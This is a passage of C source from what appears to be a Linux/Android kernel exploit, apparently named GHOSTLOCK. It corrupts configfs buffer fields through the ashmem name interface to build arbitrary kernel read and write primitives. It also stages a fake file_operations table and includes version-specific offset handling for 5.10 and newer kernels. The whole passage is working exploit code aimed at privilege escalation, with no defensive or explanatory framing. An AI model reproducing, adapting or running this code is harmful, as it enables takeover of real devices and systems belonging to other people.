    max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 12, 1, 72);
  }
  struct timespec deadline;
  clock_gettime(CLOCK_MONOTONIC, &deadline);
  deadline.tv_sec += env_int_range("PREPARE_DEADLINE_S", 180, 30, 3600);
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
      return base;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
  }
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  pr_info("cfgwrite set_name ret=%d errno=%d\n", set_ret, set_errno);
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  pr_info("cfgwrite pwrite ret=%zd errno=%d\n", wr, errno);
  return wr;
}

/* Stage-2 arm/disarm of the .read slot on the staged swap table: .read
 * = configfs read JT only for the duration of OUR pread. While disarmed,
 * system read() traffic falls through .read=NULL to the real read_iter. */
static int swap_arm_read_slot(int fd) {
  uint64_t a_cfg_r = active_offsets ? active_offsets->off_configfs_read_iter
                                    : 0;
  uint64_t cfg_r = runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF);
  uint64_t zero = 0;
  if (configfs_write_once(fd, fake_fops + FOPS_READ_OFF, &cfg_r,
                          sizeof(cfg_r)) != (ssize_t)sizeof(cfg_r))
    return 0;
  if (configfs_write_once(fd, fake_fops + FOPS_READ_ITER_OFF, &zero,
                          sizeof(zero)) != (ssize_t)sizeof(zero))
    return 0;
  return 1;
}

static void swap_disarm_read_slot(int fd) {
  uint64_t zero = 0;
  uint64_t a_ash_rditer = active_offsets ? active_offsets->off_ashmem_read_iter
                                         : 0;
  uint64_t real_rditer =
      a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0;
  configfs_write_once(fd, fake_fops + FOPS_READ_OFF, &zero, sizeof(zero));
  if (real_rditer)
    configfs_write_once(fd, fake_fops + FOPS_READ_ITER_OFF, &real_rditer,
                        sizeof(real_rditer));
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
#ifdef GHOSTLOCK_KERNEL_5_10
  /*
   * 5.10 configfs_read_bin_file copies from buffer->bin_buffer via
   * simple_read_from_buffer-style bounds: *ppos (32-bit-compared against
   * bin_buffer_size at +0x60) must be < size. JoinChang's huge
   * ASHMEM_PREFIX_COUNT-derived pos (6.12 read_iter style) overflows that
   * check here. Use a small pos and size = pos+len; bin_buffer = target-pos
   * so bin_buffer+pos lands on target.
   */
  off_t pos = 0x1000;
  if ((size_t)pos < len) pos = (off_t)len + 0x100;
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN,
        target - (uintptr_t)pos);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
        (uint32_t)pos + (uint32_t)len);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
#else
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
#endif
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  int armed = 0;
  if (g_swap_staged)
    armed = swap_arm_read_slot(fd);
  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  int rd_errno = errno;
  if (armed)
    swap_disarm_read_slot(fd);
  errno = rd_errno;
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* Accessor functions used by fops.c */
uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}
uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}
int pselect_custom_write_enabled(void) {
  return pselect_custom_write;
}
int pselect_write_shape(void) {
  return 1;
}
void set_pselect_write(uintptr_t target, uintptr_t value) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = 1;
}

/* Environment variable helpers used by fops.c */
int env_flag(const char *name, int def) {
  char *v = getenv(name);
  if (!v) return def;
  return atoi(v);
}

int env_int_range(const char *name, int def, int min, int max) {
  char *v = getenv(name);
  if (!v) return def;
  int val = (int)strtol(v, NULL, 0);
  if (val < min) return min;
  if (val > max) return max;
  return val;
}

unsigned long env_ulong(const char *name, unsigned long def) {
  char *v = getenv(name);
  if (!v) return def;
  return strtoul(v, NULL, 0);
}
